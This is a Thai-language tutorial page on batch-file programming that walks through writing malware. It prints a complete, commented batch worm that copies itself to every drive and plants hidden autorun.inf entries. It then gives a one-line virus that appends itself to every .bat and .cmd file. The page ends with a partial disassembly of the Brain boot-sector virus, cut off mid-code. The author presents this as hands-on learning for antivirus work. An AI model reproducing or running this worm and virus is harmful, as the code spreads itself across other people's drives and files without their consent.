	5. & "และคำสั่ง" (ใช้ในวินโดวส์ XP ขึ้นไป) เนื่องจาก XP สามารถเขียนคำสั่ง DOS หลายคำสั่งในบรรทัดเดียวกันได้...(บางคนไม่รู้) และคำสั่งที่ใช้ในการเชื่อมต่อคำสั่งเหล่านั้นคือ (คำสั่งDOS) & (คำสั่งDOS) & (คำสั่งDOS)
ตัวอย่างคำสั่งที่น่าสนใจ

COPY CON  A.BAT 

(หมายถึง "คัดลอกอุปกรณ์ CON ในชื่อ A.BAT") พิมพ์คำสั่งลงไป...เพราะนี้คือแป้นรับคำสั่งแบบ Notepad แต่มันกลับไปแก้ไขบรรทัดบนไม่ได้...จบการทำงานด้วย Ctrl+Z TYPE A.BAT &gt;PRN (หมายถึง "พิมพ์ข้อความ A.BAT ไปที่ เครื่องพิมพ์")

มาดูการเขียนหนอนคอมพิวเตอร์กันซะเลย...
:: นี้คือแบทช์ไฟล์หนอนคอมพิวเตอร์ที่ทำงานบนวินโดวส์ 98 , วินโดวส์  Me และ วินโดวส์  XP
:: ส่งผลให้ทุกไดร์ฟของระบบติด Autorun.INF พร้อมแนบแฟ้ม 666.bat ซึ่งเป็นหนอนไปด้วย
:: หนอนนี้จะทำงานต่อเมื่อมีคนดับเบิ้ลคลิ๊กที่ไดร์ฟที่ติดหนอน...มันจึงเริ่มทำงานในทันที
@echo off
:: คำสั่งนี้คือการซ่อนบรรทัดคำสั่ง Command Line บนดอสไม่ให้แสดงการทำงาน
if not "%1"=="" goto Inface
:: คำสั่งนี้ไว้ตรวจสอบว่ามีการเรียกใช้ลูปการค้นหาไดร์ฟหรือไม่ถ้ามีจะไปที่ตำแหน่งติดเชื้อ
for %%d in (c d e f g h i j k l m n o p q r s t u v w x y z) do call %0 %%d
:: วนการทำงานจนกว่าครบทุกไดร์ฟ...และทำการเรียกตัวเองขึ้นมาโดยส่งข้อมูลเป็นชื่อไดร์ฟ
Start .
:: เข้าสู่หน้าต่างวินโดวส์ตามปกติ...เพื่อไม่ให้ผิดสังเกต
goto endbat
:: ไปที่ตำแหน่งสุดท้าย...เพราะหมดคำสั่งควบคุม
:Inface
:: นี้คือตำแหน่งเริ่มต้นติดเชื้อ
type 666.bat &gt;%1:\666.bat
:: คัดลอกแฟ้ม 666.bat ซึ่งเป็นหนอนไปยังทุกไดร์ฟที่พบ
attrib +s +h +r %1:\666.bat &gt; nul
:: กำหนดให้แฟ้มหนอน 666.bat เป็นแฟ้มระบบและซ่อนตัวและห้ามเขียน
attrib -r -h -s %1:\autorun.inf&gt;nul
:: กำหนดคุณสมบัติของ Autorun.inf ถ้าพบจะแก้ให้เป็นแฟ้มปกติเขียนได้
echo [autorun] &gt; %1:\autorun.inf
:: ส่งข้อความ [autorun] ไปยังแฟ้ม Autorun.inf เพื่อสร้างคำสั่งหนอน
echo shellexecute=666.bat &gt;&gt;%1:\autorun.inf
:: ส่งข้อความต่อท้ายในอีกบรรทัด shellexcute=666.bat เพื่อเรียกหนอนทำงานเมื่อ Autorun
attrib +s +h +r %1:\autorun.inf &gt; nul
:: กำหนดให้แฟ้ม Autorun.inf เป็นแฟ้มระบบและซ่อนตัวและห้ามเขียน
:endbat
:: สิ้นสุดคำสั่งหนอน

จำแนกคำสั่งที่สำคัญในแบทช์ไฟล์...
	 1. คำสั่ง @ (คำสั่งซ่อนบรรทัดคอมมานด์ไลน์) คำสั่งนี้ ใช้กำหนดหน้าคำสั่ง Echo Off ซึ่งก็ทำงานเหมือนกับคำสั่งนี้เช่นกันแต่ คำสั่ง Echo Off จะไม่มีผลต่อคำสั่งของมันเอง...จึงต้องอาศัยคำสั่ง @ นำหน้าอีกทีเพื่อซ่อนบรรทัดคอมมานด์ไลน์อีกที แต่ถ้าภายในคำสั่งของ แบทช์ไฟล์มีบรรทัดที่น้อยมาก ก็อาจจะใช้ @ นำหน้าคำสั่งเหล่านั้นได้เลยเพื่อให้ประหยัดเนื้อที่คำสั่ง เช่น

@cls
@dir /as /s

หรือ

@echo off
cls
dir /as /s

	 2. คำสั่ง : (คำสั่งกำหนดตำแหน่งของชุดคำสั่ง) คำสั่งนี้คือการกำหนด ลาเบล (Label) หรือตำแหน่งของชุดคำสั่งดอสแต่ละคำสั่ง ซึ่งบางครั้ง อาจใช้กำหนดลูปการทำงานของชุดคำสั่งในแบทไฟล์เพื่อให้ทำงานแบบไม่มีวันหยุด เช่น

@echo off
:loop
:: ตำแหน่งเริ่มต้น
echo Loop Command
:: แสดงข้อความ
pause
:: รอรับคีย์บอร์ดใดๆ
goto Loop
:: วนกลับไปที่ตำแหน่งเริ่มต้น

	สำหรับ :: (คำสั่งนี้ไม่มีในตำราใดๆ ครับ) เพราะเป็นการประยุกต์ใช้ คำสั่ง : แต่ทำการซ้อนกัน 2 ตัว เพื่อให้มันไม่ถูกเรียกใช้งานจากแบทช์ไฟล์ จึงมีค่าเท่ากับคำสั่ง REM (Remark หรือ หมายเหตุ) คำสั่งนี้ถูกประยุกต์ใช้งานในคู่มือการสอนเขียนแบทช์ไฟล์ในยุคแรกๆ มาตั้งนานแล้ว...เช่น

:: นี้คือหมายเหตุ

หรือ

rem นี้คือหมายเหตุ

	 3. คำสั่ง goto (คำสั่งย้ายการทำงานไปยังลาเบลที่กำหนด) คำสั่งนี้มีผลต่อลาเบลที่อยู่ภายในแบทไฟล์นั้น...และในวินโดวส์เอ็กซ์พี นี้สามารถกำหนดให้มันรับอากิวเมนต์ของคำสั่ง IF ERRORLEVEL ได้ด้วย (ดูเงื่อนไขใน Help ของ ดอส) ในคำสั่ง : ที่ผ่านมาตำแหน่งถูกต้อง แต่ถ้าชื่อของตำแหน่งไม่ถูกต้อง เช่น

:loop
:: กำหนดตำแหน่งวนคำสั่ง
@echo Loop Command
:: แสดงข้อความเมื่อวนการทำงาน
@goto Looop
:: ไปยังตำแหน่ง Looop ซึ่งไม่มีอยู่ในคำสั่ง
@echo Error Me
:: คำสั่งนี้จะไม่สามารถทำงานได้

	จากตัวอย่างคำสั่งของแบทช์ไฟล์ไม่สามารถทำงานได้สมบรูณ์ เพราะคำสั่ง Looop นั้นไม่มีอยู่เนื่องจากผู้เขียนเติม o (โอ) เพิ่มเข้าไปอีกตัวจึงทำให้อ่านตำแหน่งผิดพลาด เป็นผลให้คำสั่งที่ต่อท้ายลงมาไม่สามารถทำงานได้ แต่คำสั่ง goto นั้นมีข้อดีตรงที่ไม่แยกแยะตัวพิมพ์เล็กหรือพิมพ์ใหญ่ เช่น

:LooP
:: กำหนดตำแหน่งวนการทำงานเป็นตัวพิมพ์เล็กและพิมพ์ใหญ่
@echo Loop Command
:: แสดงข้อความเมื่อวนการทำงาน
@goto loop
:: ไปยังตำแหน่ง LooP โดยไม่สนใจตัวพิมพ์เล็กหรือพิมพ์ใหญ่

หมายเหตุ หากคำสั่งของแบทช์ไฟล์ทำงานไม่หยุด...ให้คุณกด {Ctrl+Break} เพื่อหยุดการทำงานของมัน 
	 4. คำสั่ง if not "%1" == "" ทำคำสั่ง (คำสั่งตัดสินใจ ถ้า พารามิเตอร์ที่ 1 ไม่มีตัวอักษร ให้ทำ) คำสั่งนี้จะใช้ต่อเมื่อต้องการดูว่าพารามิเตอร์ที่ต่อท้ายแฟ้มแบทช์ไฟล์มีหรือไม่ เช่น สมมุติให้แฟ้มแบทช์ไฟล์นี้ชื่อ test.bat

C:&gt;test command1
หมายถึง ส่งคำว่า command1 ไปประมวลผลในแฟ้มชื่อ test.bat และคำสั่งนั้นคือ %1 และหากสมมุติว่า เว้นวรรค และ
พิมพ์ command2 ต่อท้าย command1 ดูตัวอย่าง

C:&gt;test command1 command2
คำว่า command2 จะถูกเรียกว่า พารามิเตอร์ที่ 2 แทนด้วย %2 ในทันที ซึ่งในแบทไฟล์นั้นสามารถรับได้สูงสุด 9 พารามิเตอร์ คือ %1 ถึง %9 ซึ่งก็มากดพอดู แต่หากแบทช์ไฟล์ของคุณต้องการพารามิเตอร์ที่มากกว่านั้น คงต้องศึกษาคำสั่ง shift เพิ่มเติมใน Help บนดอสของวินโดวส์เอ็กซ์พีกันอีกที

	 กลับมาที่ if not "%1" == "" (ให้ทำ) ว่ามันทำงานอย่างไร ในคำสั่ง If นั้นมีกิ่งก้านสาขาของคำสั่งที่มากครับ...ผมเองก็ไม่สามารถนำมาอธิบายให้ได้หมด...แต่ถ้าต้องการศึกษาให้ลึกซึ้งคงต้องพึ่งพา Help กันนะครับ...ทีนี้มาดูซิว่าทำไม่ if "%1" == "" (ให้ทำ) หรือ if not "%1" == "" (ให้ทำ) ถึงต้องมีเครื่องหมาย "" (อัญประกาศ) กำหนดพารามิเตอร์ที่ 1 ทั้งนี้ทั้งนั้นเป็นเพราะว่า if %1 == (ให้ทำ) จะเห็นว่าชุดคำสั่งไม่สมบรูณ์ ถ้าบอกดอสให้ทราบว่า %1 นั้นต้องการเปรียบเทียบกับอะไรอยู่ เพราะ ถ้าคุณเว้นว่างเอาไว้เฉยๆ จะทำให้ดอสทำงานผิดพลาดนั้นเอง ซึ่งโดยปกติแล้ว if %1 == %2 (ให้ทำ) จะสามารถเปรียบเทียบกันได้ทันที...โดยไม่ต้องระบุเครื่องหมายอัญประกาศหรือเครื่องหมายอื่นๆ นำหน้ามันเพราะ แบทช์ไฟล์เป็นภาษาสคริปที่ประมวลข้อความ (การประมวลผลการคำนวนนั้นเพิ่งจะเริ่มมีในวินโดวส์เอ็กซ์พีเป็นต้นมา) จากตัวอย่างพอจะอธิบายออกมาเป็น
รูปแบบดังนี้

@if "%1" == "" echo มีการกำหนดพารามิเตอร์ที่ 1
:: ถ้าพารามิเตอร์ที่ 1 ไม่มีข้อความแสดงข้อความ
@if not "%1" = "" echo ไม่มีการกำหนดข้อความ
:: ถ้าพารามเตอร์ไม่มีข้อความแสดงข้อความผิดพลาด
หรือ
@if "%1" == "" (echo กรุณาระบุข้อความ ) else (echo ข้อความคือ %1)
:: เงื่อนไขนี้ใช้บนวินเอ็กซ์พีขึ้นไปเพราะดอสรุ่นเก่าๆ ไม่สามารถกำหนดเงื่อนไขแบบนี้ได้

	 อย่างไรก็ดี...ผมก็อยากจะบอกน้องๆ นักศึกษาที่ไม่ได้เรียนรู้ภาษาคอมพิวเตอร์มาก่อนหรืออาจจะเคยเรียนแต่ยังไม่คล่องเกี่ยวกับเงื่อนไขการคำนวนของภาษาคอมพิวเตอร์ว่า ... คำสั่ง IF... ELSE ... นั้นเป็นหัวใจสำคัญของทุกๆ ภาษาในการเขียนโปรแกรมคอมพิวเตอร์ ฉนั้น...ควรทำความเข้าใจอย่างมากในการศึกษาเงื่อนไขของคำสั่งนี้...ไม่ใช่เพื่อการเขียนไวรัสเท่านั้น...แต่มันเป็นเงื่อนไขสำคัญในการเขียนโปรแกรมฆ่าไวรัสด้วย...คำสั่งนี้คำสั่งเดียวสามารถทำให้โปรแกรมมีขนาดยาวหรือสั้นหรือทำงานได้รวดเร็วกว่า ผู้ที่เขียนโปรแกรมด้วยกัน
	 5. คำสั่ง for %%ตัวแปร in (ชุดข้อมูล) do ทำคำสั่ง (สำหรับ %%ตัวแปร จาก ชุดข้อมูล ทำ คำสั่ง) คำสั่งนี้มีไว้สำหรับการประมวลผลแบบหลายข้อมูลภายในคำสั่งเดียว เช่น

@for %%l in (bat vbs js) do dir *.%%l
:: สำหรับ ตัวแปร l ให้ dir แฟ้มนามสกุล *.bat, *.vbs และ *.js

	 จะเป็นการทำงานกับหลายแฟ้มหรือหลายๆ ชุดข้อมูล โดยต้องเว้นวรรค ขั้นแต่ละชุดข้อมูลเอาไว้ และใช้ตัวแปร %%l ซึ่งต้องมีเครื่องหมาย %% นำหน้าเพื่อบ่งบอกว่าเป็นตัวแปรที่มาจากชุดคำสั่ง for ถ้าไม่บ่งบอกให้ถูกหลักอาจจะทำให้คำสั่งทำงานผิดพลาดอย่างมาก มาดูตัวอย่างอีกตัวอย่างเพื่อความกระจ่างอีกที เช่น

@for %%d in (a b c d e f g h i j k l m n o p q r s t u v w x y z) do if exist %%d:autorun.inf echo %%d: Werning!
:: สำหรับตัวแปร d ถ้าพบแฟ้ม (ตัวแปร d แทนไดร์ฟข้อมูล):autorun.inf แสดงข้อความเตือน (ตัวแปร d แทนไดร์ฟข้อมูล): Werning!
	
	 ซึ่งรูปแบบของคำสั่ง...ไม่มีอะไรซับซ้อน...เพียงแต่ต้องอ้างถึงรูปแบบของตัวแปรให้ถูกต้อง...ก็สามารถทำงานได้ตามเป้าหมาย สำหรับเงื่อนไขของคำสั่ง FOR เชิงลึก คือ FOR /F และเงื่อนไขอื่นๆ นั้นผมไม่ขออธิบายเพราะมันจะทำให้หนังสือเล่มนี้ดูเป็นหนังสือเชิงอ้างอิง...ซึ่งผมไม่ตั้งใจให้เป็นเช่นนั้น เพราะวัตถุประสงค์ของผมต้องการให้ผู้อ่าน ปฏิบัติและทดลองและเพื่อกระตุ้นการศึกษาค้นคว้าเพิ่มเติมต่อไป...จึงย้ำอีกทีว่าหนังสือเล่มนี้...เป็นเชิงปฏิบัติการณ์
	 6. คำสั่ง call %0 %%d (เรียกใช้แบทไฟล์ที่ทำงานอยู่ พร้อมส่งตัวแปรไปยังพารามิเตอร์ที่ 1) คำสั่งนี้จะทำให้แบทไฟล์เกิดการทำงานแบบ Overflow หรือ Error ได้เนื่องจาก ถ้าเขียนคำสั่งควบคุมนี้ไม่เป็นมันจะส่งผลให้หน่วยความเต็มได้...หรือเกิดการวนการทำงานของแบทไฟล์แบบไม่มีวันจบ เหมือนกับคำสั่ง goto เพียงแต่คำสั่งนี้จะส่งผลโดยตรงต่อหน่วยความจำ เช่น

@echo Me Activeting...
:: แสดงข้อความว่ากำลังทำงาน
@call %0
:: เรียกแฟ้มนี้ขึ้นมาทำงานอีก

	จากตัวอย่าง คำสั่งดังกล่าวจะทำงานแบบไม่มีวันจบ...รอจนกว่า ระบบปฏิบัติการณ์จะแสดงข้อความผิดพลาดในเรื่องการจัดการหน่วยความจำ หรือโปรแกรมอาจทำให้เครื่องค้างไปเลย จึงต้องระวังอย่างมากในการอ้างถึง %0 หรือ พารามิเตอร์ หลัก คือ ชื่อแฟ้มคำสั่งนั้นเอง ซึ่งโดยปกติแล้ว...จะไม่มีโปรแกรมแบทช์ไฟล์ใดอ้างถึงชื่อแฟ้มคำสั่งเพื่อมาประมวลผล...นอกเสียจากเป็น "มัลแวร์" หรือ "คำสั่งฆ่ามัลแวร์" จึงต้องแยกแยะให้ดีหากจะเขียนโปรแกรมฆ่าไวรัสจำพวกนี้....
มาดูตัวอย่างเพื่อทำความเข้าใจเกี่ยวกับการใช้คำสั่ง Call กันอีกตัวอย่าง เช่น

@echo Me Activeting...
:: แสดงข้อความ
@call %0
:: เรียกแฟ้มนี้ขึ้นมาทำงาน
@%0
:: กระโดดการทำงานไปยังแฟ้มที่เรียกใช้ คือ แฟ้มนี้ (คำสั่งนี้ไม่มีโอกาสได้ทำงาน)

	 จากตัวอย่าง ดูเหมือนว่า คำสั่งน่าจะทำงานแบบสิ้นสุด...แต่ไม่สิ้นสุดเพราะว่า คำสั่ง call จะถูกเรียกใช้ก่อน ทุกๆ ครั้งที่รันแบทซ์ไฟล์ จึงทำให้คำสั่ง %0 นั้นไม่สามารถทำงานได้...ในเครื่องที่ผมทดลองคือระบบปฏิบัติการวินโดวส์เอ็กซ์พีนั้น...มันจะแสดงหน้าต่างขึ้นมาสักพักและจะปิดตัวลง แต่ถ้าเรามาเขียนในทางกลับกัน เช่น

@echo Me Activeting...
:: แสดงข้อความ
@%0
:: กระโดดการทำงานไปยังแฟ้มที่เรียกใช้ คือ แฟ้มนี้
@call %0
:: เรียกแฟ้มนี้ขึ้นมาทำงาน (คำสั่งนี้ไม่มีโอกาสได้ทำงาน)

	 จากตัวอย่าง คำสั่งนี้จะไม่ปิดตัวเองลงไป...เพราะมันทำงานคล้ายคำสั่ง goto ส่งผลให้หน่วยความจำไม่ได้ถูกใช้ไปมากและการวนลูปการทำงานก็ยังดำเนินต่อไปอย่างไม่สิ้นสุด แต่ถ้าเราเพิ่มคำสั่งจัดการมันให้เต็มรูปแบบด้วยเงื่อนไข...จะทำให้มันทำงานได้อย่างราบรื่น เช่น

@echo Me Activeting...Parameter is %1
:: ถ้าไม่มีพารามิเตอร์ ใดๆ จะแสดงข้อความ Me Activeting...Parameter is
@if "%1" == "" %0 Again
:: ถ้าพารามิเตอร์ว่าง จะส่งคำว่า Again เป็นพารามิเตอร์ (และกระโดดการทำงานไปโดยไม่สนใจคำสั่ง ด้านล่าง)
@if "%1" == "Again" Call %0 End
:: ถ้าพารามิเตอร์เป็น Again จะเรียกแฟ้มนี้ใหม่ ส่งคำว่า End เป็น พารามิเตอร์ และจบการทำงานเพราะ ไม่มีเงือนไขการตัดสินใจ

	 เอาล่ะ...มาถึงตอนนี้ก็พอจะรู้เกี่ยวกับคำสั่งที่จำเป็นหมดแล้ว...เหลือแต่การประยุกต์คำสั่งดอสทั้งหมดมาเขียนเป็นมัลแวร์ ซึ่งไม่มีใครสามารถบอกได้หลอกว่า หนอนของใครเจ๋ง หรือไวรัสของใครร้ายกาจ เพราะมันไม่ใช่วัตถุประสงค์ของหนังสือเล่มนี้... ผู้เขียน เผยแพร่คำสั่งเหล่านี้เพื่อให้พวกคุณเป็น นักทดลองที่รู้ทั้งวิธีการทำงานของมันและวิธีป้องกันมันอย่างเต็มตัวเพราะการศึกษาเครื่องมือฆ่าคน หรือ วิชาชีพบางวิชาชีพนั้น...ก็ต้องศึกษาทั้งที่ไปที่มาของการแก้ปัญหาทั้งสิ้น หากจะเป็นวิสัญญีแพทย์ชั้นหนึ่ง...ไม่จำเป็นต้องลงมือฆ่าคน...แต่ต้องเรียนรู้จากคนที่โดนฆ่าหรือตายไปแล้ว...เพื่อเข้าใจหลักการตายและหลักการรักษาและป้องกันอย่างดี เช่นกันครับ...หนอนคอมพิวเตอร์ที่ได้ยกตัวอย่างไปนั้น...ขอให้นึกซะว่า...เป็นครูใหญ่ของพวกคุณแล้วกัน

อาวุธอันร้ายกาจไม่ใช่หนอน...แต่เป็นไวรัส!
เอาล่ะ...คุณหลายคนอาจจะอ่านเนื้อหาตอนต้นซึ่งเป็นนิยามต่างๆ ทาง คอมพิวเตอร์กันบ้างแล้ว...แต่ตอนนี้มาทำการแยกแยะกันด้วยรูปแบบของคำสั่งว่า..."อะไรกันคือหนอนคอมพิวเตอร์ และอะไรคือไวรัสคอมพิวเตอร์" เริ่มเลย...
%virus%@echo off&cd\&for /r %%f in (*.bat *.cmd) do ((
findstr "virus" "%%f"&gt;nul)&(if errorlevel 1 (echo.&gt;&gt;"%%f"&findstr "virus" "%0"&gt;&gt;"%%f" 
)))
ตัวอย่างด้านบนนี้แหละ...คือคำสั่งอันร้ายกาจ หรือเรียกมันว่า "ไวรัสคอมพิวเตอร์" เพียงบรรทัดเดียวมันสามารถทำให้คุณทึ่งกับการทำงานของมัน เพราะอะไร...ทำให้มันมีอะไรที่พิเศษกว่าหนอนคอมพิวเตอร์คือ
	 1. มันสามารถแทรกคำสั่งไวรัสคอมพิวเตอร์ไปยังหนอนคอมพิวเตอร์ได้เสียด้วย (โอ้...เป็นปาราสิตที่อาศัยหนอนคอมพิวเตอร์เป็นพาหะนำโรคได้ด้วย)
	 2. มันสามารถติดเชื้อแฟ้มคำสั่งที่ไม่ใช้หนอนคอมพิวเตอร์ได้ด้วยตัวของมันเอง...ไม่พึ่งพาใคร...ส่งผลให้แฟ้มที่ติดไวรัสเป็นพาหะนำโรคอีกต่อหนึ่งและยังไม่สามารถกำจัดมันได้โดยง่าย...เพราะมันเป็นส่วนหนึ่งในคำสั่งเหล่านั้น
	 3. ไวรัสคอมพิวเตอร์ต้องใช้ทักษะทางคอมพิวเตอร์ที่สูงกว่าหนอนคอมพิวเตอร์ในด้านโครงสร้าง เพราะ "มันคือชุดคำสั่งที่สามารถจำลองชุดคำสั่งไวรัสไปยังเป้าหมายได้โดยไม่ส่งผลกระทบต่อเป้าหมายเพื่อฝั่งชุดคำสั่งนั้นและรอการแพร่เชื้อชุดคำสั่งนั้นต่อไป"

อธิบายกันให้กระจ่างอีกที...?
	 สมมุต ว่าเครื่องของคุณติดหนอนคอมพิวเตอร์ คือ 666.bat ในทุกๆ ไดร์ฟ แต่ถ้าเกิดมีไวรัสคอมพิวเตอร์ต่อไปนี้ติดเชื้อในเครื่องของคุณด้วยมันจะส่งผลให้แฟ้มคำสั่งของหนอนคอมพิวเตอร์ (666.bat) มีขนาดโตขึ้นตามขนาดของไวรัส เช่น

@echo off
if not "%1"=="" goto Inface
for %%d in (c d e f g h i j k l m n o p q r s t u v w x y z) do call %0 %%d
Start .
goto endbat
:Inface
type 666.bat &gt;%1:\666.bat
attrib +s +h +r %1:\666.bat &gt; nul
attrib -r -h -s %1:\autorun.inf&gt;nul
echo [autorun] &gt; %1:\autorun.inf
echo shellexecute=666.bat &gt;&gt;%1:\autorun.inf
attrib +s +h +r %1:\autorun.inf &gt; nul
:endbat
%virus%@echo off&cd\&for /r %%f in (*.bat *.cmd) do ((
findstr "virus" "%%f"&gt;nul)&(if errorlevel 1 (echo.&gt;&gt;"%%f"&findstr "virus" "%0"&gt;&gt;"%%f"
))) 

	ตัวหนังสือบรรทัดสุดท้าย คือคำสั่งไวรัสที่เพิ่มเข้ามาต่อท้ายคำสั่งของหนอนคอมพิวเตอร์ โดยที่ไวรัสในตัวอย่างนี้ทำงานแบบฉลาดพอที่จะรู้ว่า แฟ้มแบทช์ไฟล์ใด ที่ติดไวรัสแล้ว...หรือแฟ้มแบทช์ไฟล์ใดยังไม่มีการติดไวรัส เมื่อแฟ้มดังกล่าวติดไวรัสแล้ว...จะส่งผลให้...หนอนคอมพิวเตอร์ตัวนี้ไม่ว่าจะติดเชื้อในเครื่องคอมพิวเตอร์เครื่องใดๆ ก็ตามมันจะนำเชื้อไวรัสที่มันติดเชื้ออยู่ไปกับมันด้วย...ส่งผลให้ไวรัสคอมพิวเตอร์สามารถระบาดในทุกๆ เครื่อง...และทุกๆ แฟ้มที่เป็น แบทช์ไฟล์ในเครื่องของคุณ
	 (ไวรัสนี้ไม่สามารถทำงานใน DOS Mode รุ่นเก่าๆ อย่าง Windows Me ได้) ตัวอย่างนี้ก็มีข้อบกพร่อง อยู่ตรงที่ มันไม่สามารถทำงานใน DOS ระดับพื้นฐานได้ ถ้าหากว่ามันติดเชื้อในแฟ้ม AUTOEXEC.BAT ก็ไม่สามารถทำงานได้ เพราะ AUTOEXEC.BAT นั้นทำงานใน DOS Mode ขั้นพื้นฐานคำสั่งบางคำสั่งของมันไม่สามารถให้บริการบนโหมดนี้
มาแยกชิ้นส่วนของไวรัสเพื่อทำการศึกษากัน...
	1. คำสั่ง cd (ออกไปยัง Root Directory) คำสั่งนี้เป็นคำสั่งพื้นฐานของดอสอยู่แล้วคงไม่ต้องอธิบายอะไรมาก ถ้าคุณใช้คำสั่ง CD WINDOWS หรือ CD "PROGRAM FILES" เพื่อเข้าไปยัง โฟลเดอร์ต่างๆ จนคุ้นเคย แต่บนวินโดวส์เอ็กซ์พี คำสั่ง CD W* ก็มีค่าเท่ากับ CD WINDOWS เหมือนกัน (เพียงแต่รูปแบบสั้นกว่า ด้วย While Card) และถอยขึ้นมายังรูทไดเร็คทอรี่ 1 ลำดับ ด้วยการ CD.. ซึ่งดูรูปแบบคำสั่งเพิ่มเติมด้วยคำสั่ง CD /?
	2. คำสั่ง for /r %%ตัวแปร in (รายการ) do ทำคำสั่ง (สำหรับค้นหาแฟ้มในรายการเพื่อทำคำสั่ง) คำสั่งนี้ใช้งานบนวินโดวส์เอ็กซ์พีขึ้นไป โดยจะแตกต่างจากคำสั่ง FOR แบบธรรมดา ตรงที่มันมีเงื่อนไข /R ซึ่งเป็นเงื่อนไขที่บ่งบอกให้ตัวแปรที่กำหนดเก็บรายชื่อแฟ้มภายในซับโฟลเดอร์ที่ทำงานลงไปทุกตัว จึงทำให้การเขียนไวรัสเป็นไปโดยง่ายเพราะ แค่คำสั่งเดียวก็ลิสต์รายชื่อแฟ้มออกมาดีกว่าคำสั่ง DIR เสียอีก เช่น

@for /r %%f in (*.*) do echo %%f
:: แสดงรายชื่อทุกแฟ้มจากโฟลเดอร์ที่ทำงานลงไปยังซับโฟลเดอร์ทั้งหมด

	 3. คำสั่ง findstr "ข้อความ" แฟ้มข้อมูล (ค้นหาข้อความในแฟ้มข้อมูลที่กำหนด) คำสั่งนี้ใช้งานบนวินโดวส์เอ็กซ์พีขึ้นไปเช่นกัน แต่เดิม คำสั่ง FIND.EXE จะทำหน้าที่นี้อยู่ แต่ในวินโดวส์เอ็กซ์พีได้บรรจุคำสั่งนี้เป็นคำสั่งภายในแล้ว แต่รูปแบบการทำงานจะคล้ายคำสั่ง FIND.EXE ตัวเดิม ซึ่งแต่เดิมคำสั่ง FIND.EXE นั้นในภาษาแอสเซมบลีตอนท้ายคำสั่ง จะมีการเรียกใช้ฟังก์ชั่น

MOV AH,4CH ; เรียกฟักช์ชั่นคืนผลลัพธ์ไปยังดอสและจบการทำงาน
INT 21H ; อินเตอร์รัพต์ของดอสโปรเซส

	 คำสั่งนี้มีผลทำต่อการคำนวนของแบทซ์ไฟล์คือ IF ERRORLEVEL ค่าของ "AL" ในโปรแกรมที่จบการทำงาน จะถูกส่งผ่านมาให้คำนวนต่อไป...ซึ่งทุกๆ คำสั่งของดอสนั้นมีทั้งสิ้น...เพียงแต่ไม่มีเอกสารเผยแพร่ออกมาให้เห็นกันเพราะบาง ERROR นั้น ถูกเก็บเป็นความลับของระบบปฏิบัติการ แต่นักเขียนโปรแกรมบางคน ก็ใช่รูปแบบการตัดสิ้นใจแบบง่าย เพื่อดูคำสั่งผิดพลาดนั้นได้ด้วยการไล่ดูทุกๆ ค่า หรือ แค่ดูว่า IF ERRORLEVEL 1 นั้นคือมีข้อผิดพลาดเกิดขึ้นแต่ไม่สนใจว่าผิดพลาดอะไร...
	4. คำสั่ง if errorlevel หมายเลข ทำคำสั่ง (ถ้ามีข้อผิดพลาดในหมายเลขทำตามคำสั่งนั้น) คำสั่งนี้เป็นคำสั่งที่ทำให้ไวรัสฉลาดขึ้นอย่างมากคือ..."ถ้าเกิดข้อผิดพลาดใดๆ ในการค้นหาข้อความ (virus) ไม่พบ จะติดเชื้อแฟ้มนั้นทันที" ซึ่งเป็นการตัดสินใจที่ชาญฉลาด...เพราะจะทำให้ไวรัสไม่ถูกเขียนซ้ำไปซ้ำมาบนแฟ้มที่ติดเชื้อไวรัส ซึ่งผู้เขียน เอง ศึกษาคำสั่งนี้มานาน...และก็ใช่อย่างคล่องแคล้วในการเขียนโปรแกรมฆ่าไวรัส แต่สำหรับผู้อ่านที่เริ่มศึกษาคำสั่ง แบทช์ไฟล์ ต้องทบทวนคำสั่งนี้เพิ่มเติมใน IF /? ในดอส เพื่อดูรูปแบบของคำสั่งที่แน่นอนรวมทั้งคำสั่งการตัดสินใจในรูปแบบอื่นๆ เพื่อเสริมความเก่งกาจในประสบการณ์ด้านนี้ต่อไป
					</pre>
					<br><a href=#main>กลับสู่หน้าหลัก</a>
				</td>
			</tr>
		</table>
	</center>
	<br>
	<center>
		<table>
			<tr>
				<td>
 					<h1 id='Menu12'>
09. ทำความเข้าใจ Boot Virus
					</h1>
				</td>
			</tr>
			<tr>
				<td>
					<pre>

; This is the ashar variant of the classic Pakistani Brain virus. It is large
; by today's standards, although it was one of the first.  It is a floppy only
; boot sector infector.
brain	   segment byte public
		assume  cs:brain, ds:brain
; Disassembly done by Dark Angel of PHALCON/SKISM
		org	0
		cli
		jmp     entervirus
idbytes	 db       34h, 12h
firsthead       db      0
firstsector     dw      2707h
curhead	 db      0
cursector       dw      1
		db      0, 0, 0, 0
		db      'Welcome to the  Dungeon	 '
copyright	db	'(c) 1986 Brain'
		db      17h
		db	'& Amjads (pvt) Ltd   VIRUS_SHOE '
		db	' RECORD   v9.0   Dedicated to th'
		db	'e dynamic memories of millions o'
		db	'f virus who are no longer with u'
		db	's today - Thanks GOODNESS!!     '
		db      '  BEWARE OF THE er..VIRUS  : \th'
		db	'is program is catching      prog'
		db	'ram follows after these messeges'
		db	'..... $'
		db	'#@%$'
		db	'@!! '
entervirus:
		mov	ax,cs
		mov     ds,ax		   ; ds = 0
		mov     ss,ax		   ; set stack to after
		mov     sp,0F000h	       ; virus
		sti
		mov     al,ds:[7C00h+offset firsthead]
		mov     ds:[7C00h+offset curhead],al
		mov     cx,ds:[7C00h+offset firstsector]
		mov     ds:[7C00h+offset cursector],cx
		call    calcnext
		mov     cx,5		    ; read five sectors
		mov     bx,7C00h+200h	   ; after end of virus

loadnext:
		call    readdisk
		call    calcnext
		add	bx,200h
		loop    loadnext

		mov     ax,word ptr ds:[413h]   ; Base memory size in Kb
		sub     ax,7		    ; - 7 Kb
		mov     word ptr ds:[413h],ax   ; Insert as new value
		mov	cl,6
		shl     ax,cl		   ; Convert to paragraphs
		mov	es,ax
		mov     si,7C00h		; Copy from virus start
		mov     di,0		    ; to start of memory
		mov     cx,1004h		; Copy 1004h bytes
		cld
		rep     movsb
		push	es
		mov	ax,200h
		push	ax
		retf			    ; return to old boot sector

readdisk:
		push	cx
		push	bx
		mov     cx,4		    ; Try 4 times

tryread:
		push	cx
		mov     dh,ds:[7C00h+offset curhead]
		mov     dl,0		    ; Read sector from default
		mov     cx,ds:[7C00h+offset cursector]
		mov     ax,201h		 ; Disk to memory at es:bx
		int     13h
		jnc     readOK
		mov     ah,0		    ; Reset disk
		int     13h		     ; (force read track 0)
		pop	cx
		loop    tryread

		int     18h		     ; ROM basic on failure
readOK:
		pop	cx
		pop	bx
		pop	cx
		retn

calcnext:
		mov     al,byte ptr ds:[7C00h+offset cursector]
		inc	al
